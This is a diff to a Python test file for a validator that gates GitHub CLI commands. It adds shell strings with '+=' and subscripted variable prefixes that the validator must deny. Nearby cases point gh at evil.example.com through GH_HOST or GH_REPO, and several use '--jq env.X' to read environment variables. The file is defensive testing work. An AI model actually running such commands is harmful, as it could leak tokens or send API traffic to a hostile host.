@@ -64,6 +64,9 @@ def test_the_decider_decodes_stdin_the_way_it_decodes_argv(monkeypatch, raw):
         "env GH_REPO=evil.example.com/o/r gh pr view 1",
         "GH_HOST+=evil.example.com gh pr list",  # += puts the value in the environment too
         "GH_REPO+=evil.example.com/o/r gh pr list",
+        "A+=1 gh pr list --json number --jq env.X",  # a += prefix on any name must not hide the call
+        "A[0]=1 gh pr list --json number --jq env.X",  # bash runs a subscripted prefix too
+        "A[0]+=1 gh pr list --json number --jq env.X",
         f"echo don't `{G}`",  # quoting the tokenizer cannot follow: the lenient split still sees the backtick call
     ],
 )
@@ -79,6 +82,7 @@ def test_spellings_the_shell_reads_differently_are_denied(cmd):
         "GH_HOST=github.com gh pr list -R o/r --json number",
         "GH_REPO=o/r gh pr list",
         "GH_REPO=github.com/o/r gh pr list",
+        "A+=1 gh pr list --json number --jq .[].number",
         "gh pr list --json title --jq '.[] | select(.title | test(\"#12\")) | .title'",  # a hash inside a string
         "gh pr comment 5 -R o/r --body-file - <<'EOF'\nuse --jq env.X and -R evil.example/o/r here\nEOF",
     ],
